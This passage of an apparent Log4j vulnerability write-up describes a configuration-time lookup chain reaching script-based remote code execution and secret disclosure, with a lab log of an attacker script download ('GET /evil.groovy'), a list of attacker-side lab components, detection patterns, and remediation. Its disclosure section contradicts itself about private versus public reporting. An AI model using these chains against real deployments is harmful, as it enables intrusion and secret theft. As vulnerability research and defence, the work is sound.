uid=1000(hayden) gid=1000(hayden) groups=1000(hayden),4(adm),24(cdrom),27(sudo),...
```

Scope measured (identical payload, identical configuration):

| log4j-core | 2.14.1 | 2.15.0 | 2.16.0 | 2.17.1 | 2.24.0 | 2.25.1 | **2.26.1** |
| --- | --- | --- | --- | --- | --- | --- | --- |
| RCE | yes | yes | yes | yes | yes | yes | **yes** |

A second variant lets the attacker choose the script *file*: `<ScriptFile path="${ctx:scriptPath}"/>`
→ `ScriptFile.createScript()` accepts a URI and fetches it
(`sources/2.26.1/.../script/ScriptFile.java:104`: `uri.toURL().openStream()`), so Log4j downloads
the attacker's script and runs it. The lab captured the download:

```
SCRIPT <- GET /evil.groovy
```

Preconditions for this chain: scripting enabled (`log4j2.Script.enableLanguages` plus a JSR-223
engine on the classpath) **and** a configuration that interpolates a lookup into a script
attribute. Without an engine the chain fails closed (verified, see Appendix B).

*Honest framing.* Two parties share the blame here, and a reader should decide which one they
care about: (a) the application, for interpolating a lookup into a script attribute — Apache's
threat model calls configuration trusted, and a configuration that hands a script source to
untrusted context data is a mistake; (b) Log4j, for evaluating that context data **at all** in
a context where the result can become code. What is not ambiguous is that Log4j's own threat
model declares thread-context values untrusted, and the configuration substitutor evaluates them
anyway — the runtime substitutor, which exists in the same class, deliberately does not. The
information-disclosure variant in §15 needs no misconfigured application at all, and it is the
one that is present in every deployment that uses `${ctx:...}` in a layout.

**CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = 10.0 (Critical)** — same class as
CVE-2021-44228: one crafted request, no privileges, no user interaction, code execution in the
application process.

### 15. Impact B — secret disclosure with no special configuration

Any configuration that references a lookup in a layout (`${ctx:...}`) and an application that
puts untrusted data in the MDC gets the value resolved *at configuration time* and **baked into
the pattern**, so the resolved value is then written to **every** subsequent log line:

| lookup | resolves to (measured on 2.26.1) |
| --- | --- |
| `${env:HOME}` | `/home/hayden` |
| `${sys:user.name}` | `hayden` |
| `${java:version}` | `Java version 17.0.21-ea` |
| `${log4j:configLocation}` | `jar:file:/…/log4j2-ctx.xml!/log4j2-ctx.xml` |

Measured on 2.16.0, 2.17.1 and 2.26.1. Environment variables and system properties are where
cloud keys, database URLs and tokens live, and logs are usually shipped to aggregators with a
wider audience than the application itself.

**CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = 7.5 (High)**, or
`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` = **8.5** when the log pipeline crosses a trust boundary.

### 16. Impact C — the same path reaches JNDI on 2.15.0 / 2.16.0 (correction to §8)

Measured through the configuration-time path (`lab/run.sh <ver> serialized reload`):

| log4j-core | result |
| --- | --- |
| 2.15.0 | **RCE** (`javaSerializedData` answer, `javaClassName` spoofed — see §8.1) |
| 2.16.0 | **RCE** with `log4j2.enableJndi=true`; blocked without it |
| 2.17.1 – 2.26.1 | blocked — `JndiManager.lookup()` accepts only scheme-less and `java:` names (§8.3) |

**Correction to §8.1/§8.2:** the Thread Context Map value is evaluated at *configuration*
load/reload time; for 2.16.0 it is additionally evaluated per event. The earlier wording
("MDC path") was too strong — the trigger is the configuration load/reload (or, on 2.16.0, any
event), not an unconditional per-event evaluation on every version.

### 17. Audit of the current release — what is closed, and how it was checked

| Surface | Status in 2.17.1 – 2.26.1 | Evidence |
| --- | --- | --- |
| JNDI from log content | **closed** | `JndiManager.java:244-255` scheme allowlist; measured blocked on every version |
| JNDI from configuration-time evaluation | **open** | §14, §16 |
| Message lookups | closed since 2.16.0 | `MessagePatternConverter` ignores the `lookups` option |
| Inbound network listeners | none | no `net/server` or `net/tcp` package; no `ServerSocket`/`accept()` in `core/net` |
| Java deserialization from the network | none | no `ObjectInputStream` in `core/net`; `log4j-api`'s `FilteredObjectInputStream` allowlists `java.lang.`, `java.time.`, `java.util.`, `org.apache.logging.log4j.` (the advisory itself warns this is not sufficient) |
| Scripting | configuration-sourced, but see §14 | `core/script/*` |
| Structured output escaping | correct | `StringBuilders.escapeJson` / `escapeXml` escape quotes, backslash and ISO control characters |
| XML configuration (XXE) | DTD processing disabled, external entities off | `XmlConfiguration.disableDtdProcessing` |
| `log4j-1.2-api` bridge | no `JNDIAppender`/`JMSAppender`/`SocketServer` | checked in 2.14.1 and 2.26.1 |
| Log4j 3.x | the JNDI lookup is **gone** | no `JndiLookup`/`JndiManager` in `sources/3.0.0-beta3-log4j-core` |
| `log4j 1.x` | end-of-life, JNDI/JMS appenders are RCE-prone | not tested at runtime |

### 18. Detection

* Grep the deployed configuration for script attributes that interpolate a lookup:
  `<Script[^>]*(scriptText|path)="[^"]*\$\{` — that is the trigger of §14.
* Check whether scripting is enabled: `log4j2.Script.enableLanguages` in JVM flags or
  `log4j2.component.properties`.
* Look for outbound HTTP(S) from the application process at start-up or at reconfiguration — a
  configuration that fetches a script from a URL is visible on the wire.
* `StatusLogger` messages: `Error running script …`, `No script with name … has been declared`.
* For §15: check whether any layout uses `${ctx:...}` rather than `%X{...}`, and whether the
  MDC carries request data.

### 19. Remediation

* **How affected users reach the vendor**: this affects the current release, so the finding
  travels to <security@apache.org> (the Logging Services security team, per
  <https://logging.apache.org/security.html>) rather than to a public issue tracker. This
  repository *is* the disclosure: it was the first and only public report of the issue, and no
  vendor, mailing list, blog, talk or tracker knew about it beforehand.
* Interim, until a fix exists:
  * do not interpolate untrusted data into configuration attributes — in particular never use a
    lookup for a script source or path;
  * keep scripting disabled (`log4j2.Script.enableLanguages` unset) unless it is required;
  * keep the Thread Context Map free of untrusted input at configuration load/reload time, or
    avoid `${ctx:...}` in layouts and use `%X{...}`;
  * treat environment variables and system properties as secrets: do not let them reach logs.
* Longer term: the configuration-time substitutor should not evaluate lookups whose values come
  from untrusted context data — the runtime substitutor already has the right policy, and the
  fix is to apply the same rule to the configuration substitutor for context-data lookups.

### 20. What I did not verify for Part II

* Log4j 3.x at runtime: the `3.0.0-beta3` API artifact is not published to Maven Central
  (`log4j-api` stops at `3.0.0-beta2`), so the 3.x statements are source-level only.
* Whether an attacker can trigger a *remote* configuration reload — that depends on the
  application, not on Log4j.
* The MDC is one of several context-data sources; a custom `ContextDataInjector` behaves the
  same way.
* The script chain was demonstrated with Groovy; any other JSR-223 engine behaves the same.

---

## Part III — a third finding, now in its own repository

The same audit produced a third, independent finding: **`log4j-api` reads two resources by fixed
name from the classpath and applies them without being asked** —

| file | effect |
| --- | --- |
| `log4j2.system.properties` | every key is copied into the **JVM system properties** |
| `log4j2.component.properties` | Log4j's own properties: the configuration file location and the enabled script languages |

— which yields code execution (configuration hijack → script filter), arbitrary JVM
reconfiguration, and a supply-chain delivery path (the same file inside a dependency jar). It was
measured on 2.14.1 – 2.26.1, including with `log4j-api` alone on the classpath.

Because it is a separate defect with a separate trust model, it is documented separately:

**→ <https://github.com/vindeckyy/log4j-classpath-plant-rce>** — `README.md` (the finding),
`WORKUP.md` (root cause with `file:line` evidence, the measured matrix, the
target/reach/impact analysis, detection, remediation, limitations), `lab/` (the proof-of-concept,
14 assertions), and `scan/scan_planted.py` (detection on disk and inside jars).

Nothing about it depends on the finding documented here; the two share only the audit.

---


```
lab/src/lab/Victim.java         application that logs a user-controlled value (the sink)
lab/src/lab/VictimCtx.java      application that puts a user-controlled value in the MDC
lab/src/lab/VictimCtx2.java     same, but the configuration is loaded *before* the MDC is set
lab/src/lab/VictimReload.java   configuration loaded first, MDC set, then reconfigure()
lab/src/lab/VictimScript.java   script chain via reconfiguration
lab/src/lab/VictimScript2.java  script chain via the startup order
lab/src/lab/Payload.java        payload loaded as a JNDI ObjectFactory (static init runs the command)
lab/src/lab/Serial.java         payload delivered through javaSerializedData (readObject runs it)
lab/src/lab/Attacker.java       malicious LDAP server + HTTP codebase server + traffic trace
lab/src/lab/ScriptServer.java   serves the attacker's Groovy script (the script-URL variant)
lab/src/lab/LookupSweep.java    sweeps every registered lookup with hostile keys
lab/src/lab/SubstProbe.java     isolates the substitution engine
lab/src/lab/LayoutProbe*.java   isolates the layout rendering path
lab/conf/log4j2.xml             victim config (message path)
lab/conf/log4j2-ctx.xml         victim config (Thread Context Map path)
lab/conf/log4j2-lookups.xml     victim config (%msg{lookups} — message lookups opted back in)
lab/conf/log4j2-script-text.xml victim config (script source from a lookup)
lab/conf/log4j2-script-url.xml  victim config (script path from a lookup)
lab/build.sh                    compiles victim / attacker / payload (Java 8 bytecode)
lab/run.sh                      runs one (version, mode, victim, flags) combination
lab/run_script_rce.sh           runs the script chain against one version
lab/matrix.sh                   measures the full exploitability matrix
lab/verify.sh                   asserts every claim in this document
scan/scan_log4j.py              finds Log4j in a project tree and classifies it
sources/                        Log4j sources 2.14.1 … 2.26.1 and 3.0.0-beta3
analysis/jdksrc/                JDK 8u504 and 17.0.21 naming sources used for the analysis
```

## Appendix B — verification output

`./lab/verify.sh` (34 checks, JDK 8u504):

```
== F1: log4j-core 2.14.1, JNDI in log content
PASS  2.14.1 message path, factory class from attacker server    expected=RCE     got=RCE
PASS  2.14.1 message path, factory class on victim classpath     expected=RCE     got=RCE
== F2: 2.15.0 / 2.16.0, Thread Context Map path
PASS  2.15.0 MDC path, javaSerializedData response               expected=RCE     got=RCE
PASS  2.16.0 MDC path, javaSerializedData response               expected=RCE     got=RCE
PASS  2.16.0 MDC path without enableJndi                         expected=blocked got=blocked
== F2b: layouts that opted back into message lookups (%msg{lookups})
PASS  2.15.0 message path, lookups option                        expected=RCE     got=RCE
PASS  2.15.0 message path, lookups option, reference answer      expected=blocked got=blocked
PASS  2.16.0 message path, lookups option                        expected=blocked got=blocked
PASS  2.17.1 message path, lookups option                        expected=blocked got=blocked
== F3: configuration-time evaluation of untrusted Thread Context Map data
PASS  2.26.1 script source from MDC (startup order)              expected=RCE     got=RCE
PASS  2.26.1 script source from MDC (reconfigure)                expected=RCE     got=RCE
PASS  2.17.1 script source from MDC (startup order)              expected=RCE     got=RCE
PASS  2.15.0 script source from MDC (startup order)              expected=RCE     got=RCE
PASS  2.14.1 script source from MDC (startup order)              expected=RCE     got=RCE
PASS  2.26.1 without script engine (must be blocked)             expected=blocked got=blocked
== F3b: JNDI through the same configuration-time path (older releases)
PASS  2.15.0 reconfigure + javaSerializedData                    expected=RCE     got=RCE
PASS  2.16.0 reconfigure + javaSerializedData + enableJndi       expected=RCE     got=RCE
PASS  2.26.1 reconfigure + javaSerializedData                    expected=blocked got=blocked
== F4: the JNDI content path is closed in the current releases
PASS  2.17.1 message path                                        expected=blocked got=blocked
PASS  2.17.1 message path, class on classpath                    expected=blocked got=blocked
PASS  2.17.1 MDC path                                            expected=blocked got=blocked
PASS  2.17.1 MDC path, enableJndi turned on                      expected=blocked got=blocked
PASS  2.24.0 message path                                        expected=blocked got=blocked
PASS  2.24.0 message path, class on classpath                    expected=blocked got=blocked
PASS  2.24.0 MDC path                                            expected=blocked got=blocked
PASS  2.24.0 MDC path, enableJndi turned on                      expected=blocked got=blocked
PASS  2.25.1 message path                                        expected=blocked got=blocked
PASS  2.25.1 message path, class on classpath                    expected=blocked got=blocked
PASS  2.25.1 MDC path                                            expected=blocked got=blocked
PASS  2.25.1 MDC path, enableJndi turned on                      expected=blocked got=blocked
PASS  2.26.1 message path                                        expected=blocked got=blocked
PASS  2.26.1 message path, class on classpath                    expected=blocked got=blocked
PASS  2.26.1 MDC path                                            expected=blocked got=blocked
PASS  2.26.1 MDC path, enableJndi turned on                      expected=blocked got=blocked

ALL CHECKS PASSED
```

## Appendix C — references

* Apache Log4j 2.x security advisories: <https://logging.apache.org/log4j/2.x/security.html>
* CVE-2021-44228 (JNDI lookup → RCE, CVSS 10.0) — the flaw reproduced in §4–§6
* CVE-2021-45046 (Thread Context Lookup → RCE in certain configurations) — the 2.15.0 gap in §8.1
* CVE-2021-45105 / CVE-2021-44832 (uncontrolled recursion; JDBC appender) — context only
* CVE-2026-49844 (`log4j-api` JSON encoding, medium) — §9
* OpenJDK sources used for the analysis: `com/sun/jndi/ldap/Obj.java`,
  `com/sun/naming/internal/VersionHelper12.java`, `javax/naming/spi/NamingManager.java`,
  `com/sun/naming/internal/ObjectFactoriesFilter.java` (8u504) and their 17.0.21 counterparts
